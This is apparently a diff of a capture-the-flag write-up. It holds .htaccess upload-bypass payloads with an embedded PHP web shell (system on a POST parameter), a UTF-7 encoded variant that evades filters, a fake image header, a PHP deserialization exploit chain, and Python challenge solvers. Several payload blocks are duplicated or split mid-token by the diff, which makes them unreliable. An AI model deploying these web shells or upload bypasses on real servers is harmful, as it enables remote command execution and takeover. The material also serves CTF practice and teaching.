@@ -265,30 +265,8 @@ print(flag)
 
 
 ```
-#define width 1337
-#define height 1337
-```
-
-
-
-```
-<Files ~ "^.ht">
- Require all granted
- Order allow,deny
- Allow from all
-</Files>
-```
-
-
-
-```
-SetHandler application/x-httpd-php
-# <?=system($_POST[whoami]);?>
-```
-
-
-
-```
+    #define width 1337
+    #define height 1337
 <Files ~ "^.ht">
  Require all granted
  Order allow,deny
@@ -296,11 +274,13 @@ SetHandler application/x-httpd-php
 </Files>
 SetHandler application/x-httpd-php
 # <?=system($_POST[whoami]);?>
-```
-
-
-
-```
+<Files ~ "^.ht">
+ Require all granted
+ Order allow,deny
+ Allow from all
+</Files>
+SetHandler application/x-httpd-php
+# <?=system($_POST[whoami]);?>
 <Files ~ "^.ht">
  Require all granted
  Order allow,deny
@@ -310,13 +290,8 @@ SetHandler application/x-httpd-php
 php_flag zend.multibyte 1
 php_value zend.script_encoding "UTF-7"
 # +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4
-```
-
-
-
-```
-#define width 1337
-#define height 1337
+    #define width 1337
+    #define height 1337
 <Fi
 les ~ "^.ht">
  Require all granted
@@ -335,11 +310,6 @@ ph
 p_val
 ue zend.script_encoding "UTF-7"
 # +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4
-```
-
-
-
-```
 <?php
 error_reporting(0);
 
@@ -365,11 +335,6 @@ $poc->filepage = new Transfer();
 $poc->filepage->method = new Transfer();
 $poc->filepage->method->method = new File_operations();
 echo urlencode(serialize($poc));
-```
-
-
-
-```
 from Crypto.Util.number import *
 import gmpy2
 import hashlib
@@ -437,11 +402,6 @@ tmp = recover(c)
 flag = rrecover(tmp)
 print(flag)
 print('flag{'+hashlib.md5(str(flag).encode()).hexdigest()+'}')
-```
-
-
-
-```
 from Crypto.Util.number import *
 import gmpy2
 import hashlib
@@ -452,11 +412,6 @@ flag = (k * s1 - h1) * gmpy2.invert(r1,q) % q
 print(flag)
 print(long_to_bytes(flag))
 print('flag{' + hashlib.md5(str(flag).encode()).hexdigest() + '}')
-```
-
-
-
-```
 from PIL import Image
 MAX = 400
 pic = Image.new("RGB",(MAX, MAX))
@@ -471,11 +426,6 @@ for y in range (0,MAX):
         i = i+1
 pic.show()
 pic.save("11.png")
-```
-
-
-
-```
 y = [169,178,231,186,187,120,180,187,152,171,222,58,165,156,215,149,93,219,31,160,26,50,88,254,197,99,197,46,79,38,26,65,91,191,128,141,138,189]
 x = [0xAE, 0xBF, 0xE7, 0xBC, 0xA1, 0x7A, 0xE5, 0xEA, 0x98, 0xF9, 0x8B, 0x39, 0xA5, 0x9B, 0x8E, 0x95, 0x04, 0xDE, 0x1A, 0xA2, 0x4A, 0x36, 0x0C, 0xAF, 0xC5, 0x32, 0xC2, 0x7F, 0x4A, 0x70, 0x19, 0x15, 0x58, 0xEE, 0x84, 0xDD, 0xDC, 0xA1]
 flag = ''
